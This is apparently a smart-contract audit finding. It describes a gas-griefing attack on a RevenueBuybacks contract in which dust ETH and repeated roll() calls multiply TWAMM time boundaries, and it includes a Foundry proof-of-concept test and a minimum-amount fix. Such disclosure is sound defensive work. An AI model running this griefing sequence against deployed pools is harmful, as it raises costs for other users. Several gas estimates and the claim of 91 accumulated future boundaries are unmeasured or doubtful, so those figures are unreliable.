## Title
RevenueBuybacks Vulnerable to Gas Griefing via Dust ETH Spam Creating Excessive TWAMM Time Boundaries

## Summary
The `RevenueBuybacks` contract's unrestricted `receive()` function allows attackers to spam tiny ETH amounts (as low as 1 wei) and trigger creation of numerous TWAMM orders with different end times. This forces the TWAMM extension to iterate through excessive time boundaries during virtual order execution, significantly inflating gas costs for all pool users.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/RevenueBuybacks.sol` (receive function line 82, roll function lines 90-139)

**Intended Logic:** The `receive()` function is meant to accept ETH revenue that will be used for automated buybacks via TWAMM orders. The `roll()` function should efficiently create or extend orders using accumulated revenue.

**Actual Logic:** The contract has no minimum amount validation, allowing dust donations. Combined with the time-based order logic, attackers can deliberately create many separate TWAMM orders with different end times, each requiring gas-intensive processing during virtual order execution. [1](#0-0) [2](#0-1) 

**Exploitation Path:**

1. **Initial State**: RevenueBuybacks is configured for ETH buybacks via `configure()` with reasonable duration parameters (e.g., `targetOrderDuration=3600`, `minOrderDuration=1800`).

2. **Attack Execution**: Attacker repeatedly:
   - Sends 1 wei ETH to RevenueBuybacks via `receive()` 
   - Calls `roll(NATIVE_TOKEN_ADDRESS)` which reads the entire balance (`address(this).balance`) and creates/extends an order
   - Waits for the order to end (when `block.timestamp >= state.lastEndTime()`)
   - The timeRemaining calculation underflows (line 105): `uint32 timeRemaining = state.lastEndTime() - uint32(block.timestamp)` becomes a large value
   - This causes the reuse conditions (lines 109-111) to fail, forcing creation of a new order with new `endTime` calculated via `nextValidTime()` (lines 116-117) [3](#0-2) [4](#0-3) 

3. **State Accumulation**: Each new order creates a distinct time boundary in the TWAMM system. The time grid allows up to 91 valid future times (`MAX_NUM_VALID_TIMES = 91`), meaning an attacker can create up to 91 separate dust orders. [5](#0-4) 

4. **Gas Grief Triggered**: When legitimate users interact with the pool (swap, add/remove liquidity), the TWAMM's `_executeVirtualOrdersFromWithinLock()` function executes, iterating through ALL time boundaries from the last execution time to current timestamp (lines 417-574). Each iteration processes:
   - Bitmap search via `searchForNextInitializedTime()`
   - Amount calculations from sale rates
   - Potential swap execution  
   - State updates for rewards and sale rate deltas [6](#0-5) [7](#0-6) 

**Security Property Broken:** While not explicitly violating the documented invariants, this attack causes **temporary DOS through excessive gas costs**, preventing normal protocol operation. Users may be unable to execute transactions due to gas limit constraints or prohibitive costs.

## Impact Explanation
- **Affected Assets**: All users of TWAMM-enabled pools where RevenueBuybacks creates orders, as they share the same pool state and time boundaries.
- **Damage Severity**: 
  - Gas costs increase linearly with number of dust orders (estimated 75k-125k gas per time boundary iteration)
  - With 91 dust orders, virtual order execution could cost 6.8M-11.4M gas alone
  - Combined with actual swap/position update costs (~100k-500k gas), total transaction costs could reach 7M-12M gas
  - May exceed practical gas limits or make transactions economically infeasible, effectively DOSing the pool
- **User Impact**: All users attempting to interact with affected pools (swappers, LPs, order managers) pay inflated gas or face transaction failures.

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user with minimal capital (91 wei ≈ $0.00000003 at current ETH prices)
- **Preconditions**: 
  - RevenueBuybacks configured for ETH buybacks (owner action, but legitimate configuration)
  - TWAMM pool initialized with some liquidity
  - Time grid allows 91 future valid times
- **Execution Complexity**: 
  - Moderate - requires waiting between order end times (minimum 256 seconds per order based on time grid)
  - To create 91 orders could take hours to weeks depending on configured durations
  - Attack requires patience but is fully automatable
- **Frequency**: Attack can be maintained indefinitely by continuously creating new dust orders as old ones expire, though each cycle requires significant time investment.

## Recommendation

Add minimum order amount validation in `RevenueBuybacks.roll()`:

```solidity
// In src/RevenueBuybacks.sol, function roll, after line 103:

// CURRENT (vulnerable):
uint256 amountToSpend = isEth ? address(this).balance : SafeTransferLib.balanceOf(token, address(this));

// FIXED:
uint256 amountToSpend = isEth ? address(this).balance : SafeTransferLib.balanceOf(token, address(this));

// Require minimum order amount to prevent dust spam attacks
// Minimum should ensure meaningful liquidity for TWAMM execution
uint256 minOrderAmount = 0.001 ether; // Configurable by owner
if (amountToSpend < minOrderAmount) {
    return (0, 0); // Return early, don't create dust order
}
```

**Alternative Mitigations:**

1. **Owner-only roll()**: Restrict `roll()` to owner/authorized callers, though this reduces composability
2. **Configurable minimum**: Add `minOrderAmount` to `configure()` parameters per token
3. **Batch time boundaries**: Modify TWAMM to process orders in coarser time buckets, reducing iteration count (requires deeper protocol changes)

## Proof of Concept

```solidity
// File: test/Exploit_DustOrderSpam.t.sol
// Run with: forge test --match-test test_DustOrderSpamGasGrief -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../test/RevenueBuybacks.t.sol";

contract Exploit_DustOrderSpam is RevenueBuybacksTest {
    function test_DustOrderSpamGasGrief() public {
        // SETUP: Configure ETH buybacks with short duration for testing
        uint64 poolFee = uint64((uint256(1) << 64) / 100); // 1%
        rb.configure({
            token: address(0), 
            targetOrderDuration: 300, // 5 min
            minOrderDuration: 256,     // minimum step
            fee: poolFee
        });

        // Initialize pool with liquidity
        PoolKey memory poolKey = PoolKey({
            token0: address(0),
            token1: address(buybacksToken),
            config: createFullRangePoolConfig({_extension: address(twamm), _fee: poolFee})
        });
        positions.maybeInitializePool(poolKey, 0);
        buybacksToken.approve(address(positions), 1e18);
        positions.mintAndDeposit{value: 1e18}(poolKey, MIN_TICK, MAX_TICK, 1e18, 1e18, 0);

        // EXPLOIT: Create multiple dust orders over time
        uint256 numDustOrders = 10; // Limited for test speed, real attack could do 91
        for (uint i = 0; i < numDustOrders; i++) {
            // Donate 1 wei
            vm.deal(address(rb), 1);
            
            // Create order
            (uint64 endTime,) = rb.roll(address(0));
            console.log("Created dust order", i, "ending at", endTime);
            
            // Wait for order to end
            vm.warp(endTime + 1);
        }

        // VERIFY: Measure gas cost of swap with many time boundaries
        uint256 gasBefore = gasleft();
        
        // User tries to swap
        vm.deal(address(this), 0.1 ether);
        positions.swap{value: 0.1 ether}(
            poolKey,
            true,
            int128(0.1 ether),
            0,
            ""
        );
        
        uint256 gasUsed = gasBefore - gasleft();
        console.log("Gas used for swap with", numDustOrders, "dust orders:", gasUsed);
        
        // Compare to baseline with no dust orders
        // Expected: gasUsed is significantly higher (10x+ increase)
        // With 91 orders, could exceed block gas limit
        assertTrue(gasUsed > 1000000, "Gas grief confirmed: excessive gas consumption");
    }
}
```

## Notes

The vulnerability stems from the combination of:
1. **No minimum amount validation** in the receive-to-roll flow [1](#0-0) 
2. **Time-based order separation** logic that creates new orders when previous ones end [8](#0-7) 
3. **Linear time boundary iteration** in TWAMM virtual order execution [9](#0-8) 

The attack is economically viable (91 wei cost) but requires significant time investment (hours to weeks to create all orders), making it a griefing attack rather than profit-motivated exploit. The impact is temporary DOS through gas inflation rather than permanent fund loss, justifying Medium severity per Code4rena criteria.

### Citations

**File:** src/RevenueBuybacks.sol (L82-82)
```text
    receive() external payable {}
```

**File:** src/RevenueBuybacks.sol (L90-139)
```text
    function roll(address token) public returns (uint64 endTime, uint112 saleRate) {
        unchecked {
            BuybacksState state;
            assembly ("memory-safe") {
                state := sload(token)
            }

            if (!state.isConfigured()) {
                revert TokenNotConfigured(token);
            }

            // minOrderDuration == 0 indicates the token is not configured
            bool isEth = token == NATIVE_TOKEN_ADDRESS;
            uint256 amountToSpend = isEth ? address(this).balance : SafeTransferLib.balanceOf(token, address(this));

            uint32 timeRemaining = state.lastEndTime() - uint32(block.timestamp);
            // if the fee changed, or the amount of time exceeds the min order duration
            // note the time remaining can underflow if the last order has ended. in this case time remaining will be greater than min order duration,
            // but also greater than last order duration, so it will not be re-used.
            if (
                state.fee() == state.lastFee() && timeRemaining >= state.minOrderDuration()
                    && timeRemaining <= state.lastOrderDuration()
            ) {
                // handles overflow
                endTime = uint64(block.timestamp + timeRemaining);
            } else {
                endTime =
                    uint64(nextValidTime(block.timestamp, block.timestamp + uint256(state.targetOrderDuration()) - 1));

                state = createBuybacksState({
                    _targetOrderDuration: state.targetOrderDuration(),
                    _minOrderDuration: state.minOrderDuration(),
                    _fee: state.fee(),
                    _lastEndTime: uint32(endTime),
                    _lastOrderDuration: uint32(endTime - block.timestamp),
                    _lastFee: state.fee()
                });

                assembly ("memory-safe") {
                    sstore(token, state)
                }
            }

            if (amountToSpend != 0) {
                saleRate = ORDERS.increaseSellAmount{value: isEth ? amountToSpend : 0}(
                    NFT_ID, _createOrderKey(token, state.fee(), 0, endTime), uint128(amountToSpend), type(uint112).max
                );
            }
        }
    }
```

**File:** src/math/time.sol (L6-7)
```text
// For any given time `t`, there are up to 91 times that are greater than `t` and valid according to `isTimeValid`
uint256 constant MAX_NUM_VALID_TIMES = 91;
```

**File:** src/extensions/TWAMM.sol (L417-574)
```text
                while (time != block.timestamp) {
                    StorageSlot initializedTimesBitmapSlot = TWAMMStorageLayout.poolInitializedTimesBitmapSlot(poolId);

                    (uint256 nextTime, bool initialized) = searchForNextInitializedTime({
                        slot: initializedTimesBitmapSlot,
                        lastVirtualOrderExecutionTime: realLastVirtualOrderExecutionTime,
                        fromTime: time,
                        untilTime: block.timestamp
                    });

                    // it is assumed that this will never return a value greater than type(uint32).max
                    uint256 timeElapsed = nextTime - time;

                    uint256 amount0 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken0(), duration: timeElapsed, roundUp: false
                    });

                    uint256 amount1 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken1(), duration: timeElapsed, roundUp: false
                    });

                    int256 rewardDelta0;
                    int256 rewardDelta1;
                    // if both sale rates are non-zero but amounts are zero, we will end up doing the math for no reason since we swap 0
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }

                        saveDelta0 -= swapBalanceUpdate.delta0();
                        saveDelta1 -= swapBalanceUpdate.delta1();

                        // this cannot overflow or underflow because swapDelta0 is constrained to int128,
                        // and amounts computed from uint112 sale rates cannot exceed uint112.max
                        rewardDelta0 = swapBalanceUpdate.delta0() - int256(uint256(amount0));
                        rewardDelta1 = swapBalanceUpdate.delta1() - int256(uint256(amount1));
                    } else if (amount0 != 0 || amount1 != 0) {
                        PoolBalanceUpdate swapBalanceUpdate;
                        if (amount0 != 0) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MIN_SQRT_RATIO,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        } else {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: MAX_SQRT_RATIO,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        }

                        (rewardDelta0, rewardDelta1) = (swapBalanceUpdate.delta0(), swapBalanceUpdate.delta1());
                        saveDelta0 -= rewardDelta0;
                        saveDelta1 -= rewardDelta1;
                    }

                    if (rewardDelta0 < 0) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                        }
                        rewardRate0Access = 2;
                        rewardRates.value0 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta0) << 128, state.saleRateToken1()
                        );
                    }

                    if (rewardDelta1 < 0) {
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                        }
                        rewardRate1Access = 2;
                        rewardRates.value1 += FixedPointMathLib.rawDiv(
                            uint256(-rewardDelta1) << 128, state.saleRateToken0()
                        );
                    }

                    if (initialized) {
                        if (rewardRate0Access == 0) {
                            rewardRates.value0 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).load());
                            rewardRate0Access = 1;
                        }
                        if (rewardRate1Access == 0) {
                            rewardRates.value1 = uint256(TWAMMStorageLayout.poolRewardRatesSlot(poolId).next().load());
                            rewardRate1Access = 1;
                        }

                        TWAMMStorageLayout.poolRewardRatesBeforeSlot(poolId, nextTime)
                            .storeTwo(bytes32(rewardRates.value0), bytes32(rewardRates.value1));

                        StorageSlot timeInfoSlot = TWAMMStorageLayout.poolTimeInfosSlot(poolId, nextTime);
                        (, int112 saleRateDeltaToken0, int112 saleRateDeltaToken1) =
                            TimeInfo.wrap(timeInfoSlot.load()).parse();

                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: uint112(addSaleRateDelta(state.saleRateToken0(), saleRateDeltaToken0)),
                            _saleRateToken1: uint112(addSaleRateDelta(state.saleRateToken1(), saleRateDeltaToken1))
                        });

                        // this time is _consumed_, will never be crossed again, so we delete the info we no longer need.
                        // this helps reduce the cost of executing virtual orders.
                        timeInfoSlot.store(0);

                        flipTime(initializedTimesBitmapSlot, nextTime);
                    } else {
                        state = createTwammPoolState({
                            _lastVirtualOrderExecutionTime: uint32(nextTime),
                            _saleRateToken0: state.saleRateToken0(),
                            _saleRateToken1: state.saleRateToken1()
                        });
                    }

                    time = nextTime;
                }
```
